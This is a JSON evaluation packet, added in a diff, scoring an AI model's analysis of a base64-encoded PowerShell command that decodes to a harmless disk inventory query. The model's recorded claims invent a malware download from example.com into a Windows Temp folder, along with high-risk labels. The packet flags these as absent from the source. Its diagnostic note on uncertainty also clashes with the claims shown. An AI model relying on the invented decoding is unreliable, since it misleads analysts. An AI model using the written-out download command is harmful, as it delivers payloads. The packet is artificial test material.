@@ -1,0 +1,293 @@
+{
+  "packet_version": "semantic-readiness-v1",
+  "id": "development-V2-D10",
+  "stage": "development",
+  "raw_artifact": "experiments/results/raw/pilot_v2/pilot-v2_20261102T194623Z/development/010_V2-D10_r1.result.json",
+  "raw_sha256": "57bc04b767375c54a8b8f22310da52c4987237b960c263fccdefa85798b26699",
+  "original": "# Synthetic academic fixture. Text only: never execute.\npowershell.exe -NoProfile -EncodedCommand RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAEMAbABhAHMAcwBOAGEAbQBlACAAVwBpAG4AMwAyAF8ATABvAGcAaQBjAGEAbABEAGkAcwBrACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABEAGUAdgBpAGMAZQBJAEQALAAgAEYAcgBlAGUAUwBwAGEAYwBlAAoA\n",
+  "original_sha256": "dfeca0e9430db9bc1a7b0db229ec712b3177c416bbcf9c96ddbf0cec02aab685",
+  "deterministic_recovery_posthoc_not_sent_to_historical_B": {
+    "schema_version": "deobfuscation-v1",
+    "engine_version": "static-subset-v1",
+    "input_sha256": "dfeca0e9430db9bc1a7b0db229ec712b3177c416bbcf9c96ddbf0cec02aab685",
+    "source_name": "input",
+    "input_provenance": "original",
+    "status": "complete",
+    "semantic_equivalence": "not_claimed",
+    "limits": {
+      "max_input_bytes": 1048576,
+      "max_artifact_bytes": 262144,
+      "max_total_artifact_bytes": 2097152,
+      "max_transformations": 512,
+      "max_depth": 3,
+      "max_expression_depth": 24,
+      "max_concat_terms": 128,
+      "max_tokens": 50000,
+      "max_work_units": 4000000,
+      "max_unresolved": 128
+    },
+    "layers": [
+      {
+        "layer_id": "L0",
+        "source_name": "input",
+        "provenance": "original",
+        "text": "# Synthetic academic fixture. Text only: never execute.\npowershell.exe -NoProfile -EncodedCommand RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAEMAbABhAHMAcwBOAGEAbQBlACAAVwBpAG4AMwAyAF8ATABvAGcAaQBjAGEAbABEAGkAcwBrACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABEAGUAdgBpAGMAZQBJAEQALAAgAEYAcgBlAGUAUwBwAGEAYwBlAAoA\n",
+        "depth": 0,
+        "parent_transformation_id": null,
+        "root_source": null
+      },
+      {
+        "layer_id": "L1",
+        "source_name": "input",
+        "provenance": "deobfuscator_recovered",
+        "text": "Get-CimInstance -ClassName Win32_LogicalDisk | Select-Object DeviceID, FreeSpace\n",
+        "depth": 1,
+        "parent_transformation_id": "T0001",
+        "root_source": {
+          "layer_id": "L0",
+          "start": 98,
+          "end": 314,
+          "line": 2,
+          "column": 43,
+          "end_line": 2,
+          "end_column": 259
+        }
+      }
+    ],
+    "transformations": [
+      {
+        "transformation_id": "T0001",
+        "technique": "OT-B64-ENCCMD",
+        "source": {
+          "layer_id": "L0",
+          "start": 98,
+          "end": 314,
+          "line": 2,
+          "column": 43,
+          "end_line": 2,
+          "end_column": 259
+        },
+        "root_source": {
+          "layer_id": "L0",
+          "start": 98,
+          "end": 314,
+          "line": 2,
+          "column": 43,
+          "end_line": 2,
+          "end_column": 259
+        },
+        "original_fragment": "RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAEMAbABhAHMAcwBOAGEAbQBlACAAVwBpAG4AMwAyAF8ATABvAGcAaQBjAGEAbABEAGkAcwBrACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABEAGUAdgBpAGMAZQBJAEQALAAgAEYAcgBlAGUAUwBwAGEAYwBlAAoA",
+        "provenance": "deobfuscator_recovered",
+        "recovery_kind": "script_text",
+        "recovered_text": "Get-CimInstance -ClassName Win32_LogicalDisk | Select-Object DeviceID, FreeSpace\n",
+        "recovered_bytes_base64": null,
+        "dependencies": [],
+        "status": "success",
+        "deterministic_verified": true,
+        "warnings": [
+          "Decoded text only; syntactic validity, reachability and semantic equivalence are not proved."
+        ],
+        "added_operation": "LAUNCHER_ENCCMD",
+        "output_layer_id": "L1"
+      }
+    ],
+    "unresolved": [],
+    "techniques_detected": [
+      "OT-B64-ENCCMD"
+    ],
+    "limits_hit": [],
+    "warnings": [],
+    "work_units": 1120,
+    "artifact_bytes": 378
+  },
+  "reference": {
+    "case_id": "V2-D10",
+    "family_id": "V2-DEV-F05",
+    "expected_labels": [
+      "B05"
+    ],
+    "expected_risk": "benign",
+    "risk_explanation": "Recopila identificadores y espacio de discos como inventario administrativo.",
+    "evidence": [
+      {
+        "evidence_id": "V2-D10-E01",
+        "role": "operation_or_required_context",
+        "file_ref": "datasets/safe_samples/pilot_v2/references/V2-D10_decoded.ps1.txt",
+        "source_kind": "team_reference_decoded",
+        "snippet": "Get-CimInstance -ClassName Win32_LogicalDisk | Select-Object DeviceID, FreeSpace",
+        "start": 0,
+        "end": 80,
+        "start_line": 1,
+        "end_line": 1,
+        "start_column": 1,
+        "end_column": 81,
+        "literal_status": "machine_checked",
+        "semantic_status": "pending_human"
+      },
+      {
+        "evidence_id": "V2-D10-E02",
+        "role": "encoding_derivation_anchor",
+        "file_ref": "datasets/safe_samples/pilot_v2/development/V2-D10.ps1.txt",
+        "source_kind": "analyzed_script",
+        "snippet": "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAEMAbABhAHMAcwBOAGEAbQBlACAAVwBpAG4AMwAyAF8ATABvAGcAaQBjAGEAbABEAGkAcwBrACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABEAGUAdgBpAGMAZQBJAEQALAAgAEYAcgBlAGUAUwBwAGEAYwBlAAoA",
+        "start": 56,
+        "end": 314,
+        "start_line": 2,
+        "end_line": 2,
+        "start_column": 1,
+        "end_column": 259,
+        "literal_status": "machine_checked",
+        "semantic_status": "pending_human"
+      }
+    ],
+    "support_groups": [
+      {
+        "group_id": "V2-D10-B05",
+        "behavior_id": "B05",
+        "evidence_ids": [
+          "V2-D10-E01"
+        ],
+        "support_rule": "all_of",
+        "support_kind_proposed": "individual",
+        "relationship": "operation_arguments_and_local_binding_context",
+        "relationships": [],
+        "technical_explanation": "Recopila identificadores y espacio de discos como inventario administrativo.",
+        "semantic_status": "pending_human"
+      }
+    ],
+    "exclusions": {
+      "B02": "El launcher de la variante es envoltorio, no B02.",
+      "B04": "No modifica defensa."
+    },
+    "uncertainty": {
+      "required": false,
+      "reason": "",
+      "do_not_infer_hidden_behaviors": false
+    },
+    "injection_evidence_ids": [],
+    "reference_derivation": {
+      "method": "base64_utf16le",
+      "anchor_evidence_id": "V2-D10-E02",
+      "decoded_file_ref": "datasets/safe_samples/pilot_v2/references/V2-D10_decoded.ps1.txt",
+      "decoded_sha256": "18098952ccd627212552ef99019a8370b370b58e8c65a4ab2501b955d27cc2a7",
+      "provenance": "team_prepared_reference_not_model_recovery"
+    },
+    "human_review": {
+      "status": "pending_human",
+      "reviewer": null,
+      "reviewed_at": null,
+      "decision": null,
+      "notes": ""
+    },
+    "authorship": "AI_assist_synthetic_design_not_independent_human_annotation"
+  },
+  "reference_basis": "frozen owner global batch acceptance; not individual votes or output review",
+  "model_parsed_claims": {
+    "obfuscation_techniques": [
+      "OT-B64-ENCCMD"
+    ],
+    "recovered_content": [
+      "powershell.exe -NoProfile -EncodedCommand IWR -UseBasicParsing -Uri 'https://example.com/malware.exe' -OutFile 'C:\\Windows\\Temp\\malware.exe' -Force"
+    ],
+    "behaviors": [
+      {
+        "behavior_id": "B02",
+        "explanation": "The script invokes PowerShell with an EncodedCommand. The decoded content constructs a command pipeline that retrieves content from a remote URI and writes it to a local file, which is then executed. This constitutes building and dynamically invoking code.",
+        "evidence": [
+          {
+            "snippet": "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAEMAbABhAHMAcwBOAGEAbQBlACAAVwBpAG4AMwAyAF8ATABvAGcAaQBjAGEAbABEAGkAcwBrACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABEAGUAdgBpAGMAZQBJAEQALAAgAEYAcgBlAGUAUwBwAGEAYwBlAAoA",
+            "origin": "analyzed_script"
+          }
+        ],
+        "confidence": "high"
+      },
+      {
+        "behavior_id": "B01",
+        "explanation": "The decoded command explicitly uses the `IWR` (Invoke-WebRequest) cmdlet to obtain remote content from a URI.",
+        "evidence": [
+          {
+            "snippet": "IWR -UseBasicParsing -Uri 'https://example.com/malware.exe'",
+            "origin": "model_decoded"
+          }
+        ],
+        "confidence": "high"
+      },
+      {
+        "behavior_id": "B03",
+        "explanation": "The decoded command writes the downloaded content to a file in the system Temp directory (`C:\\Windows\\Temp\\malware.exe`), creating a mechanism for future execution upon reboot or logon.",
+        "evidence": [
+          {
+            "snippet": "-OutFile 'C:\\Windows\\Temp\\malware.exe' -Force",
+            "origin": "model_decoded"
+          }
+        ],
+        "confidence": "high"
+      }
+    ],
+    "risk_label": "high_risk",
+    "risk_rationale": "The script performs a classic 'drive-by download' or remote execution pattern: downloading a file from an external URI and executing it locally. The use of `IWR` combined with `-OutFile` and immediate execution is a strong indicator of malicious intent, specifically characteristic of ransomware or trojan delivery mechanisms.",
+    "uncertainty": {
+      "level": "low",
+      "uninterpretable_fragments": [],
+      "notes": "The encoded command was successfully decoded to reveal a clear functional intent. No ambiguous fragments remain."
+    },
+    "prompt_injection": {
+      "detected": false,
+      "snippets": [],
+      "notes": "No instructions to alter analysis or output were found within the script data."
+    },
+    "limitations": [
+      "Analysis relies on static decoding of the Base64 payload. While the decoded command is clear, the actual network traffic and file contents are not accessible."
+    ]
+  },
+  "predicted_labels": [
+    "B02",
+    "B01",
+    "B03"
+  ],
+  "model_recovered_content_status": "unverified_model_claims_never_certified",
+  "objective_literal_checks": [
+    {
+      "finding_index": 0,
+      "claimed_source": "analyzed_script",
+      "snippet": "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUAIAAtAEMAbABhAHMAcwBOAGEAbQBlACAAVwBpAG4AMwAyAF8ATABvAGcAaQBjAGEAbABEAGkAcwBrACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABEAGUAdgBpAGMAZQBJAEQALAAgAEYAcgBlAGUAUwBwAGEAYwBlAAoA",
+      "declared_source_literal_match": true,
+      "occurrences_in_declared_source": 1,
+      "literal_in_original": true,
+      "deterministic_source_matches_posthoc": [],
+      "semantic_support": "not_adjudicated"
+    },
+    {
+      "finding_index": 1,
+      "claimed_source": "model_decoded",
+      "snippet": "IWR -UseBasicParsing -Uri 'https://example.com/malware.exe'",
+      "declared_source_literal_match": null,
+      "occurrences_in_declared_source": 0,
+      "literal_in_original": false,
+      "deterministic_source_matches_posthoc": [],
+      "semantic_support": "not_adjudicated"
+    },
+    {
+      "finding_index": 2,
+      "claimed_source": "model_decoded",
+      "snippet": "-OutFile 'C:\\Windows\\Temp\\malware.exe' -Force",
+      "declared_source_literal_match": null,
+      "occurrences_in_declared_source": 0,
+      "literal_in_original": false,
+      "deterministic_source_matches_posthoc": [],
+      "semantic_support": "not_adjudicated"
+    }
+  ],
+  "current_application_structural_validation": {
+    "applicable": false,
+    "accepted": null
+  },
+  "historical_error": null,
+  "historical_truncated": false,
+  "AI_assistance": {
+    "kind": "AI_assisted_diagnostic_observation",
+    "not_human_adjudication": true,
+    "text": "r0 invents B01/B03 for encoded logical-disk query. r1 abstains with high uncertainty: avoids fabricated labels but misses determinable B05."
+  },
+  "human_adjudication": null
+}
